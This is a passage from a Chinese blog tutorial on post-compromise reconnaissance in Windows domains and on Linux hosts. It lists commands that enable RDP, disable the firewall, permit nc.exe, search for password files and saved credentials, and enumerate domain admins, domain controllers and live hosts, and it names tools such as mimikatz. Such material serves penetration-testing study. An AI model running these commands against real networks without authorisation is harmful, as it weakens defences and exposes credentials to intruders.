2003开启3389</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic path win32_terminalservicesetting where (__CLASS !&#x3D; “”) call setallowtsconnections 1</span><br></pre></td></tr></table></figure><p>在windows Server 2008和2012 中开启3389</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1、wmic &#x2F;namespace:\\root\cimv2\terminalservices path win32_terminalservicesetting where (__CLASS !&#x3D; &quot;&quot;) call setallowtsconnections 1</span><br><span class="line">2、wmic &#x2F;namespace:\\root\cimv2\terminalservices path win32_tsgeneralsetting where (TerminalName &#x3D;&#39;RDP-Tcp&#39;) call setuserauthenticationrequired 1</span><br><span class="line">3、reg add &quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; &#x2F;v fSingleSessionPerUser &#x2F;t REG_DWORD &#x2F;d 0 &#x2F;f</span><br></pre></td></tr></table></figure><p><img src="/imgs/image-20201223152938843.png" alt="image-20201223152938843"></p><h5 id="查看防火墙相关配置"><a href="#查看防火墙相关配置" class="headerlink" title="查看防火墙相关配置"></a>查看防火墙相关配置</h5><p><strong>关闭防火墙</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># Windows server 2003及之前的版本</span><br><span class="line">netsh firewall set opmode disable</span><br><span class="line"># Windows server 2003之后的版本</span><br><span class="line">netsh advfirewall set allprofiles state off</span><br></pre></td></tr></table></figure><p><strong>查看防火墙配置</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh firewall show config</span><br></pre></td></tr></table></figure><p><strong>修改防火墙配置</strong></p><p>Windows Server 2003及以前版本 允许指定程序全部连接</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh firewall add allowedprogram c:\nc.exe &quot;allow nc&quot; enable</span><br></pre></td></tr></table></figure><p>Windows Server 2003之后版本 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 允许指定程序全部连接</span><br><span class="line">netsh advfirewall firewall add rule name&#x3D;&quot;pass nc&quot; dir&#x3D;in action&#x3D;allow programe&#x3D;&quot;C:\nc.exe&quot;</span><br><span class="line"># 允许指定程序退出</span><br><span class="line">netsh advfirewall firewall add rule name&#x3D;&quot;Allow nc&quot; dir&#x3D;out action&#x3D;allow programe&#x3D;&quot;C:\nc.exe&quot;</span><br><span class="line"># 允许3389端口放行</span><br><span class="line">netsh advfirewall firewall add rule name&#x3D;&quot;Remote Desktop&quot; protocol&#x3D;TCP dir&#x3D;in localport&#x3D;3389 action&#x3D;allow</span><br></pre></td></tr></table></figure><p><strong>自定义防火墙日志存储位置</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh advfirewall set currentprofile logging filename &quot;C:\windows\temp\fw.log&quot;</span><br></pre></td></tr></table></figure><h5 id="翻找本地敏感文件及密码本"><a href="#翻找本地敏感文件及密码本" class="headerlink" title="翻找本地敏感文件及密码本"></a>翻找本地敏感文件及密码本</h5><p>网核心敏感数据，不仅包括数据库，电子邮件，也包含个人数据，业务数据，技术数据等等，大部分敏感数据基本都在内网中。查找敏感文件，可参考：<a href="https://my.oschina.net/u/4196756/blog/4444701" target="_blank" rel="noopener">https://my.oschina.net/u/4196756/blog/4444701</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">站点源码备份文件、数据库备份文件、配置信息文件等等</span><br><span class="line">浏览器保存的密码和浏览器的cookie、敏感软件如xshell、keepass等记录的密码</span><br><span class="line">其他用户会话，3389和ipc$连接记录，回收站中的信息等等</span><br><span class="line">Windows的无线密码</span><br><span class="line">网络内部的各种账号密码，包含电子邮箱，VPN，FTP等等</span><br><span class="line">命令执行历史记录</span><br><span class="line">总结密码规律</span><br><span class="line">本地用户习惯</span><br><span class="line"></span><br><span class="line">1.指定目录下搜集各类敏感文件</span><br><span class="line">dir &#x2F;a &#x2F;s &#x2F;b d:\&quot;*.txt&quot;</span><br><span class="line">dir &#x2F;a &#x2F;s &#x2F;b d:\&quot;*.xml&quot;</span><br><span class="line">dir &#x2F;a &#x2F;s &#x2F;b d:\&quot;*.mdb&quot;</span><br><span class="line">dir &#x2F;a &#x2F;s &#x2F;b d:\&quot;*.sql&quot;</span><br><span class="line">dir &#x2F;a &#x2F;s &#x2F;b d:\&quot;*.mdf&quot;</span><br><span class="line">dir &#x2F;a &#x2F;s &#x2F;b d:\&quot;*.eml&quot;</span><br><span class="line">dir &#x2F;a &#x2F;s &#x2F;b d:\&quot;*.pst&quot;</span><br><span class="line">dir &#x2F;a &#x2F;s &#x2F;b d:\&quot;*conf*&quot;</span><br><span class="line">dir &#x2F;a &#x2F;s &#x2F;b d:\&quot;*bak*&quot;</span><br><span class="line">dir &#x2F;a &#x2F;s &#x2F;b d:\&quot;*pwd*&quot;</span><br><span class="line">dir &#x2F;a &#x2F;s &#x2F;b d:\&quot;*pass*&quot;</span><br><span class="line">dir &#x2F;a &#x2F;s &#x2F;b d:\&quot;*login*&quot;</span><br><span class="line">dir &#x2F;a &#x2F;s &#x2F;b d:\&quot;*user*&quot;</span><br><span class="line">2.指定目录下的文件中搜集各种账号密码</span><br><span class="line">findstr &#x2F;si pass *.inc *.config *.ini *.txt *.asp *.aspx *.php *.jsp *.xml *.cgi *.bak</span><br><span class="line">findstr &#x2F;si userpwd *.inc *.config *.ini *.txt *.asp *.aspx *.php *.jsp *.xml *.cgi *.bak</span><br><span class="line">findstr &#x2F;si pwd *.inc *.config *.ini *.txt *.asp *.aspx *.php *.jsp *.xml *.cgi *.bak</span><br><span class="line">findstr &#x2F;si login *.inc *.config *.ini *.txt *.asp *.aspx *.php *.jsp *.xml *.cgi *.bak</span><br><span class="line">findstr &#x2F;si user *.inc *.config *.ini *.txt *.asp *.aspx *.php *.jsp *.xml *.cgi *.bak</span><br></pre></td></tr></table></figure><h5 id="凭证收集"><a href="#凭证收集" class="headerlink" title="凭证收集"></a>凭证收集</h5><p>凭证等信息收集，参考：<a href="https://blog.csdn.net/nilwiaoglwigjwlg/article/details/82834068或https://yoga7xm.top/2019/04/09/IPentest-admin/#Windows-Hash%E8%8E%B7%E5%8F%96" target="_blank" rel="noopener">https://blog.csdn.net/nilwiaoglwigjwlg/article/details/82834068或https://yoga7xm.top/2019/04/09/IPentest-admin/#Windows-Hash%E8%8E%B7%E5%8F%96</a></p><p>常用工具mimikatz、wce、Invoke-WCMDump、vaultcmd(win系统自带)</p><h4 id="WMIC自动收集"><a href="#WMIC自动收集" class="headerlink" title="WMIC自动收集"></a>WMIC自动收集</h4><p>使用WMIC自动收集，winxp低权限用户不允许访问WMIC，Windows7以上版本的低权限用户允许访问WMIC，下载地址：<a href="http://www.fuzzysecurity.com/scripts/files/wmic_info.rar" target="_blank" rel="noopener">http://www.fuzzysecurity.com/scripts/files/wmic_info.rar</a></p><p>WMIC脚本内容如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">for &#x2F;f &quot;delims&#x3D;&quot; %%A in (&#39;dir &#x2F;s &#x2F;b %WINDIR%\system32\*htable.xsl&#39;) do set &quot;var&#x3D;%%A&quot;</span><br><span class="line"></span><br><span class="line">wmic process get CSName,Description,ExecutablePath,ProcessId &#x2F;format:&quot;%var%&quot; &gt;&gt; out.html</span><br><span class="line">wmic service get Caption,Name,PathName,ServiceType,Started,StartMode,StartName &#x2F;format:&quot;%var%&quot; &gt;&gt; out.html</span><br><span class="line">wmic USERACCOUNT list full &#x2F;format:&quot;%var%&quot; &gt;&gt; out.html</span><br><span class="line">wmic group list full &#x2F;format:&quot;%var%&quot; &gt;&gt; out.html</span><br><span class="line">wmic nicconfig where IPEnabled&#x3D;&#39;true&#39; get Caption,DefaultIPGateway,Description,DHCPEnabled,DHCPServer,IPAddress,IPSubnet,MACAddress &#x2F;format:&quot;%var%&quot; &gt;&gt; out.html</span><br><span class="line">wmic volume get Label,DeviceID,DriveLetter,FileSystem,Capacity,FreeSpace &#x2F;format:&quot;%var%&quot; &gt;&gt; out.html</span><br><span class="line">wmic netuse list full &#x2F;format:&quot;%var%&quot; &gt;&gt; out.html</span><br><span class="line">wmic qfe get Caption,Description,HotFixID,InstalledOn &#x2F;format:&quot;%var%&quot; &gt;&gt; out.html</span><br><span class="line">wmic startup get Caption,Command,Location,User &#x2F;format:&quot;%var%&quot; &gt;&gt; out.html</span><br><span class="line">wmic PRODUCT get Description,InstallDate,InstallLocation,PackageCache,Vendor,Version &#x2F;format:&quot;%var%&quot; &gt;&gt; out.html</span><br><span class="line">wmic os get name,version,InstallDate,LastBootUpTime,LocalDateTime,Manufacturer,RegisteredUser,ServicePackMajorVersion,SystemDirectory &#x2F;format:&quot;%var%&quot; &gt;&gt; out.html</span><br><span class="line">wmic Timezone get DaylightName,Description,StandardName &#x2F;format:&quot;%var%&quot; &gt;&gt; out.html</span><br></pre></td></tr></table></figure><p>执行结果以列表的形式列出服务、用户、用户组、网络接口、硬盘、补丁、自启动程序、软件、操作系统和时区的详细信息：</p><p><img src="/imgs/image-20201223160529682.png" alt="image-20201223160529682"></p><h3 id="2、查询当前权限"><a href="#2、查询当前权限" class="headerlink" title="2、查询当前权限"></a>2、查询当前权限</h3><h5 id="查看当前用户权限"><a href="#查看当前用户权限" class="headerlink" title="查看当前用户权限"></a>查看当前用户权限</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whoami</span><br></pre></td></tr></table></figure><p><img src="/imgs/image-20201223204608203.png" alt="image-20201223204608203"></p><p>查询whoami可能返回三种结果：本地普通用户、本地管理员、域内用户。</p><p>对于本地普通用户，只能查询本机的相关信息；本地管理员和域内用户可以查询域内相关信息。</p><p>域内用户查询原理是域内所有查询都通过域控制器实现，基于LDAP协议，域内相关信息查询需要经过权限认证。当域用户执行查询命令时，会使用Kerberos协议认证。</p><p>本地管理员Administrator权限可提升为Ntauthority或System权限，在域内除普通用户外，所有主机都有一个机器用户，用户名是机器名+”$“。在本质上，机器的system用户对应的就是域内的机器用户，所以使用System权限可以运行域相关查询命令。简单来说就是System权限能查询域内相关信息，而Administrator可直接提权为System。</p><h5 id="获取域SID"><a href="#获取域SID" class="headerlink" title="获取域SID"></a>获取域SID</h5><p>可以查询当前用户SID和域的SID</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whoami &#x2F;all</span><br></pre></td></tr></table></figure><p><img src="/imgs/image-20201223210727882.png" alt="image-20201223210727882"></p><h5 id="查询指定用户详细信息"><a href="#查询指定用户详细信息" class="headerlink" title="查询指定用户详细信息"></a>查询指定用户详细信息</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user username &#x2F;domain</span><br></pre></td></tr></table></figure><p><img src="/imgs/image-20201223211259704.png" alt="image-20201223211259704"></p><h3 id="3、判断是否存在域"><a href="#3、判断是否存在域" class="headerlink" title="3、判断是否存在域"></a>3、判断是否存在域</h3><p>域内一般控制了大量的主机，所以进入内网后重要的一步也是寻找域。</p><p>判断所控主机是否在域内，采用以下方法。</p><h5 id="ipconfig命令判断是否在域内"><a href="#ipconfig命令判断是否在域内" class="headerlink" title="ipconfig命令判断是否在域内"></a>ipconfig命令判断是否在域内</h5><p>查看网络配置信息，如果有域会有<strong>主DNS后缀</strong>和DNS服务器，主DNS后缀没有的一定不在域内。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ipconfig &#x2F;all</span><br></pre></td></tr></table></figure><p><img src="/imgs/image-20201223211701890.png" alt="image-20201223211701890"></p><h5 id="Systeminfo判断是否在域内"><a href="#Systeminfo判断是否在域内" class="headerlink" title="Systeminfo判断是否在域内"></a>Systeminfo判断是否在域内</h5><p>systeminfo查询结果域显示<code>WORKGROUP</code>就不在域内，否则在域内。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systeminfo | findstr &#x2F;B &#x2F;C:&quot;域&quot;</span><br></pre></td></tr></table></figure><p><img src="/imgs/image-20201223212149393.png" alt="image-20201223212149393"></p><p><img src="/imgs/image-20201223212401951.png" alt="image-20201223212401951"></p><h5 id="查询当前登录域和登录用户信息"><a href="#查询当前登录域和登录用户信息" class="headerlink" title="查询当前登录域和登录用户信息"></a>查询当前登录域和登录用户信息</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net config workdstation</span><br></pre></td></tr></table></figure><p><img src="/imgs/image-20201223213012490.png" alt="image-20201223213012490"></p><h5 id="通过时间服务器判断"><a href="#通过时间服务器判断" class="headerlink" title="通过时间服务器判断"></a>通过时间服务器判断</h5><p>域服务器一般会同时为时间服务器</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net time &#x2F;domain</span><br></pre></td></tr></table></figure><p>不存在域，会返回找不到域控制器：</p><p><img src="/imgs/image-20201223212611968.png" alt="image-20201223212611968"></p><p>存在域，并且当前用户是域用户，会返回时间：</p><p><img src="/imgs/image-20201223212707285.png" alt="image-20201223212707285"></p><p>存在域但当前用户不是域用户，会显示”发生系统错误5“。</p><h3 id="4、探测域内存活主机"><a href="#4、探测域内存活主机" class="headerlink" title="4、探测域内存活主机"></a>4、探测域内存活主机</h3><blockquote><p>内网存活主机探测非常重要，方便对存活主机进行下一步渗透拿下。在白天和晚上分别探测 方便进行对比。</p></blockquote><p>以下方式推荐优先使用NetBIOS和ICMP。</p><h5 id="利用NetBIOS探测"><a href="#利用NetBIOS探测" class="headerlink" title="利用NetBIOS探测"></a>利用NetBIOS探测</h5><blockquote><p><strong>NetBIOS</strong>，为网上基本输入输出系统（英语：Network Basic Input/Output System）的缩写，它提供了OSI模型中的会话层服务，让在不同计算机上运行的不同程序，可以在局域网中，互相连线，以及分享数据。严格来说，NetBIOS不是一种网上协议，而是应用程序接口（API）。</p><p>几乎所有的局域网都在NetBIOS基础上工作。NetBIOS提供了名称服务，包括名称登录与名称解析，主要用于局域网中的计算机互访。其工作流程是正常的机器名解析查询应答过程，推荐优先使用该方法探测。</p></blockquote><p>netscan命令行工具在内网使用时要先上传到目标主机，支持linux和windows平台。扫描速度比较快，可以反馈出IP、域名和主机名、开启的服务。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">nbt.exe 192.168.1.1&#x2F;24</span><br><span class="line"></span><br><span class="line">开启的服务类型主要包括以下几种：</span><br><span class="line">SHARKING - 存在正在运行的文件和打印共享服务，不一定有内容共享</span><br><span class="line">DC - 存在域控</span><br><span class="line">U&#x3D;USER - 该主机有登录名为User的用户</span><br><span class="line">IIS - 安装了IIS服务器</span><br><span class="line">EXCHANGE - 安装了Exchange服务</span><br><span class="line">NOTES - 安装了Lotus Notes电子邮件客户端</span><br><span class="line">？ - 没有识别出NetBIOS资源</span><br></pre></td></tr></table></figure><p><img src="/imgs/image-20201224150216531.png" alt="image-20201224150216531"></p><h5 id="利用ICMP探测"><a href="#利用ICMP探测" class="headerlink" title="利用ICMP探测"></a>利用ICMP探测</h5><p>对内网IP执行ping命令来探测存活主机。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for &#x2F;L %I in (1,1,254) DO @ping -w 1 -n 1 1.1.1.%I | findstr &quot;TTL&#x3D;&quot;</span><br></pre></td></tr></table></figure><p><img src="/imgs/image-20201224151640668.png" alt="image-20201224151640668"></p><h5 id="利用ARP探测"><a href="#利用ARP探测" class="headerlink" title="利用ARP探测"></a>利用ARP探测</h5><p>可以用arp-scan、Empire的arpscan模块、Nishang的Invoke-ARPScan.ps1。</p><p><strong>arp-scan:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arp.exe -t 1.1.1.1&#x2F;24</span><br></pre></td></tr></table></figure><p><img src="/imgs/image-20201224153837480.png" alt="image-20201224153837480"></p><p><strong>Empire的arpscan模块:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">usemodule situational_awareness&#x2F;network&#x2F;arpscan</span><br><span class="line">set Range 1.1.1.1-.1.1.1.254</span><br><span class="line">execute</span><br></pre></td></tr></table></figure><p><strong>Nishang的Invoke-ARPScan.ps1:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell -exec bypass -Command &quot;&amp; &#123;Import-Module C:\Users\29176\Desktop\tools\Invoke-ARPScan.ps1; Invoke-ARPScan -CIDR 1.1.1.1&#x2F;24&#125;&quot;</span><br></pre></td></tr></table></figure><p><img src="/imgs/image-20201224154843810.png" alt="image-20201224154843810"></p><h3 id="5、域内端口-服务信息收集"><a href="#5、域内端口-服务信息收集" class="headerlink" title="5、域内端口 服务信息收集"></a>5、域内端口 服务信息收集</h3><h5 id="通过常规TCP-UDP端口扫描探测内网"><a href="#通过常规TCP-UDP端口扫描探测内网" class="headerlink" title="通过常规TCP/UDP端口扫描探测内网"></a>通过常规TCP/UDP端口扫描探测内网</h5><p>ScanLine是一款经典的端口扫描工具，可以在所有版本Windows操作系统中使用，可以探测存活主机和端口</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scanline -h -t 22,80-89,110,389,445,3389,1099,1433,2049,6379,7001,8080,1521,3306,5432 -u 53,161,137,139, -O c:\results.txt -p 1.1.1.1-254 &#x2F;b</span><br></pre></td></tr></table></figure><p><img src="/imgs/image-20201227194226046.png" alt="image-20201227194226046"></p><h5 id="telnet命令"><a href="#telnet命令" class="headerlink" title="telnet命令"></a>telnet命令</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">telnet DC 3389</span><br></pre></td></tr></table></figure><h5 id="S扫描器"><a href="#S扫描器" class="headerlink" title="S扫描器"></a>S扫描器</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s.exe TCP 1.1.1.1 1.1.1.2 21,22,80,89,110,389,445,3389,1099,1433,2049,6379,7001,8080,1521,3306,5432,53,161,137,139 256 &#x2F;Banner &#x2F;save</span><br></pre></td></tr></table></figure><h5 id="Metasploit扫描"><a href="#Metasploit扫描" class="headerlink" title="Metasploit扫描"></a>Metasploit扫描</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;auxiliary&#x2F;scanner&#x2F;portscan&#x2F;tcp</span><br></pre></td></tr></table></figure><h5 id="Nishang的Invoke-PortScan模块"><a href="#Nishang的Invoke-PortScan模块" class="headerlink" title="Nishang的Invoke-PortScan模块"></a>Nishang的Invoke-PortScan模块</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-PortScan -StartAddress 1.1.1.1 EndAddress 1.1.1.254 -ResolveHost</span><br></pre></td></tr></table></figure><h3 id="6、收集域内基础信息"><a href="#6、收集域内基础信息" class="headerlink" title="6、收集域内基础信息"></a>6、收集域内基础信息</h3><p>确定了主机所在网络有域并且主机在域内，可以进一步收集域内信息。</p><h5 id="查询域"><a href="#查询域" class="headerlink" title="查询域"></a>查询域</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net view &#x2F;domain</span><br></pre></td></tr></table></figure><p><img src="/imgs/image-20201227195030102.png" alt="image-20201227195030102"></p><h5 id="查询域内所有计算机"><a href="#查询域内所有计算机" class="headerlink" title="查询域内所有计算机"></a>查询域内所有计算机</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net view &#x2F;domain:SERVER08</span><br></pre></td></tr></table></figure><p><img src="/imgs/image-20201227195141672.png" alt="image-20201227195141672"></p><h5 id="查询域内所有用户组列表"><a href="#查询域内所有用户组列表" class="headerlink" title="查询域内所有用户组列表"></a>查询域内所有用户组列表</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net group &#x2F;domain</span><br></pre></td></tr></table></figure><p><img src="/imgs/image-20201227195926449.png" alt="image-20201227195926449"></p><h5 id="获取所有域成员计算机列表"><a href="#获取所有域成员计算机列表" class="headerlink" title="获取所有域成员计算机列表"></a>获取所有域成员计算机列表</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net group &quot;domain computers&quot; &#x2F;domain</span><br></pre></td></tr></table></figure><p><img src="/imgs/image-20201227200106683.png" alt="image-20201227200106683"></p><h5 id="获取域密码信息"><a href="#获取域密码信息" class="headerlink" title="获取域密码信息"></a>获取域密码信息</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net accounts &#x2F;domain</span><br></pre></td></tr></table></figure><p><img src="/imgs/image-20201227200242991.png" alt="image-20201227200242991"></p><h5 id="获取域信任消息"><a href="#获取域信任消息" class="headerlink" title="获取域信任消息"></a>获取域信任消息</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nltest &#x2F;domain_trusts</span><br></pre></td></tr></table></figure><p><img src="/imgs/image-20201227200351779.png" alt="image-20201227200351779"></p><h3 id="7、查找域控制器"><a href="#7、查找域控制器" class="headerlink" title="7、查找域控制器"></a>7、查找域控制器</h3><h5 id="查看域控的机器名"><a href="#查看域控的机器名" class="headerlink" title="查看域控的机器名"></a>查看域控的机器名</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nltest &#x2F;DCLIST:SERVER08</span><br></pre></td></tr></table></figure><p><img src="/imgs/image-20201227201238380.png" alt="image-20201227201238380"></p><h5 id="查看当前时间"><a href="#查看当前时间" class="headerlink" title="查看当前时间"></a>查看当前时间</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net time &#x2F;domain</span><br></pre></td></tr></table></figure><p><img src="/imgs/image-20201227201701138.png" alt="image-20201227201701138"></p><h5 id="查看域控制器组"><a href="#查看域控制器组" class="headerlink" title="查看域控制器组"></a>查看域控制器组</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netdom query pdc</span><br></pre></td></tr></table></figure><p><img src="/imgs/image-20201227201746518.png" alt="image-20201227201746518"></p><h3 id="8、获取域内用户和管理员信息"><a href="#8、获取域内用户和管理员信息" class="headerlink" title="8、获取域内用户和管理员信息"></a>8、获取域内用户和管理员信息</h3><h5 id="查询所有域用户列表"><a href="#查询所有域用户列表" class="headerlink" title="查询所有域用户列表"></a>查询所有域用户列表</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 通过向DC进行查询，其中krbtgt用户不仅可以创建票据授权服务（TGS）的加密密钥，还可以实现多种域内权限持久化方法</span><br><span class="line">net user &#x2F;domain</span><br><span class="line"># 获取域内用户详细信息</span><br><span class="line">wmic useraccount get &#x2F;all</span><br><span class="line"># 查看存在的用户</span><br><span class="line">dsquery user</span><br></pre></td></tr></table></figure><p><img src="/imgs/image-20201227202400149.png" alt="image-20201227202400149"></p><h5 id="查询管理员相关信息"><a href="#查询管理员相关信息" class="headerlink" title="查询管理员相关信息"></a>查询管理员相关信息</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 查询本地管理员组用户</span><br><span class="line">net localgroup administrators</span><br><span class="line"># 查询域管理员用户</span><br><span class="line">net group &quot;domain admins&quot; &#x2F;domain</span><br><span class="line"># 查询管理员用户组</span><br><span class="line">net group &quot;Enterprise Admins&quot; &#x2F;domain</span><br></pre></td></tr></table></figure><p><img src="/imgs/image-20201227202758588.png" alt="image-20201227202758588"></p><h5 id="定位域管理员"><a href="#定位域管理员" class="headerlink" title="定位域管理员"></a>定位域管理员</h5><p>如果在Windows域中已经获得了普通用户权限，希望在域内横向移动，需要知道域内用户登录位置、它是否是任何系统的本地管理员、它所属的组、是否有权访问文件共享等。枚举主机、用户和组，有助于更换的了解域的布局。</p><p>常用域管理员定位工具有psloggedon.exe、PVEFindADUser.exe、netsess.exe以及hunter、NetView等，在Powershell中，最常用的是PowerView。</p><h3 id="9、查找域管理进程"><a href="#9、查找域管理进程" class="headerlink" title="9、查找域管理进程"></a>9、查找域管理进程</h3><p>在渗透过程中，一个典型的域渗透提权过程，通常围绕着收集明文凭据或者通过mimikatz提权等方法，在获取了管理员权限的系统中寻找域管理员登录进程，进而收集域管理员的凭据。如果内网环境复杂，渗透人员无法立即在拥有权限的系统中获得域管理员进程，那么通常可以采用以下方法：在跳板机直接跳转，直至获取域管理员权限，同时进行一些分析工作，进而找到渗透测试的路径。</p><h5 id="本机检查"><a href="#本机检查" class="headerlink" title="本机检查"></a>本机检查</h5><p>列出本机的所有有进程及进程用户</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tasklist &#x2F;v</span><br></pre></td></tr></table></figure><p><img src="/imgs/image-20201227204423574.png" alt="image-20201227204423574"></p><h5 id="查询域控制器的域用户会话"><a href="#查询域控制器的域用户会话" class="headerlink" title="查询域控制器的域用户会话"></a>查询域控制器的域用户会话</h5><p>在域控制器中查询域用户会话列表，并将其与域管理员列表进行交叉引用，从而得到域管理会话系统列表。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 查询域控列表</span><br><span class="line">net group &quot;Domain Controllers&quot; &#x2F;domain</span><br><span class="line"># 收集域管理员列表</span><br><span class="line">net group &quot;domain admins&quot; &#x2F;domain</span><br><span class="line"># 收集所有活动域的会话列表,下载地址：</span><br><span class="line">NetSess -h</span><br><span class="line"># 交叉引用域管理员列表域活动会话列表</span><br><span class="line">FOR &#x2F;F %i in (dcs.txt) do @echo [+] Querying DC %i &amp;&amp; @netsess -h %i 2&gt;nul &gt;session.txt &amp;&amp; FOR &#x2F;F %a in (admins.txt) do @type sessions.txt | @findstr &#x2F;I %a</span><br></pre></td></tr></table></figure><h3 id="10、Linux主机信息收集"><a href="#10、Linux主机信息收集" class="headerlink" title="10、Linux主机信息收集"></a>10、Linux主机信息收集</h3><p>参考：<a href="https://blog.csdn.net/qq_45226339/article/details/105663902" target="_blank" rel="noopener">https://blog.csdn.net/qq_45226339/article/details/105663902</a></p><h4 id="操作系统信息收集"><a href="#操作系统信息收集" class="headerlink" title="操作系统信息收集"></a>操作系统信息收集</h4><h5 id="发行版本"><a href="#发行版本" class="headerlink" title="发行版本"></a>发行版本</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/issue</span><br><span class="line">ls /etc/*-release</span><br><span class="line">cat /etc/lsb-release（Debian）</span><br><span class="line">cat /etc/red-release（Redhat）</span><br></pre></td></tr></table></figure><h5 